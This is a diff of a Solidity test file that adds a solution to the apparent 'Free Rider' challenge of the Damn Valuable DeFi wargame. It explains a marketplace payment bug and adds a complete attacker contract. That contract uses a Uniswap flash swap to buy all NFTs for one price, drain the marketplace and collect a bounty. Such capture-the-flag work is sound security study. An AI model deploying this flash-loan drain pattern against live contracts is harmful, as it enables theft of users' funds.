@@ -7,10 +7,12 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +125,37 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        /**
+         * VULNERABILITY EXPLANATION:
+         * The FreeRiderNFTMarketplace._buyOne() has a critical bug on line 108:
+         *   payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
+         * 
+         * This is called AFTER the NFT transfer, so ownerOf(tokenId) is now the BUYER,
+         * not the seller! The marketplace pays the buyer instead of the seller.
+         *
+         * Additionally, buyMany() only checks if msg.value >= price ONCE but reuses
+         * the same msg.value check for all purchases. So with just 15 ETH, you can
+         * buy all 6 NFTs and get 90 ETH back (6 * 15 ETH payments to yourself).
+         *
+         * EXPLOIT STRATEGY:
+         * 1. Flash swap 15 WETH from Uniswap V2 pair
+         * 2. Unwrap WETH to ETH
+         * 3. Buy all 6 NFTs with 15 ETH (marketplace pays us 90 ETH due to bug)
+         * 4. Send NFTs to recoveryManager to claim 45 ETH bounty
+         * 5. Repay flash swap (~15.05 WETH with 0.3% fee)
+         * 6. Send remaining ETH to player
+         */
+
+        // Deploy attacker and execute the flash swap
+        FreeRiderAttacker attacker = new FreeRiderAttacker(
+            uniswapPair,
+            weth,
+            marketplace,
+            nft,
+            recoveryManager,
+            player
+        );
+        attacker.attack();
     }
 
     /**
@@ -145,4 +177,79 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+/**
+ * @notice Attacker contract that uses flash swap to exploit the marketplace bug
+ */
+contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
+    IUniswapV2Pair private pair;
+    WETH private weth;
+    FreeRiderNFTMarketplace private marketplace;
+    DamnValuableNFT private nft;
+    FreeRiderRecoveryManager private recoveryManager;
+    address private player;
+
+    uint256 constant NFT_PRICE = 15 ether;
+    uint256 constant AMOUNT_OF_NFTS = 6;
+
+    constructor(
+        IUniswapV2Pair _pair,
+        WETH _weth,
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        FreeRiderRecoveryManager _recoveryManager,
+        address _player
+    ) {
+        pair = _pair;
+        weth = _weth;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        player = _player;
+    }
+
+    function attack() external {
+        // Initiate flash swap for 15 WETH (token0 in the pair)
+        // The data parameter being non-empty triggers the callback
+        pair.swap(NFT_PRICE, 0, address(this), abi.encode("flash"));
+    }
+
+    // Called by Uniswap V2 pair during flash swap
+    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
+        require(msg.sender == address(pair), "Not pair");
+
+        // Step 1: Unwrap WETH to ETH
+        weth.withdraw(amount0);
+
+        // Step 2: Buy all 6 NFTs with just 15 ETH (marketplace pays us back each time!)
+        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            tokenIds[i] = i;
+        }
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+
+        // Step 3: Send all NFTs to recovery manager to claim bounty
+        // The last NFT transfer triggers the bounty payment to player
+        bytes memory data = abi.encode(player);
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, data);
+        }
+
+        // Step 4: Repay flash swap (amount + 0.3% fee)
+        uint256 repayAmount = (amount0 * 1000 / 997) + 1;
+        weth.deposit{value: repayAmount}();
+        weth.transfer(address(pair), repayAmount);
+
+        // Step 5: Send remaining ETH to player
+        payable(player).transfer(address(this).balance);
+    }
+
+    // Required to receive NFTs
+    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    // Required to receive ETH from marketplace and WETH unwrap
+    receive() external payable {}
 }
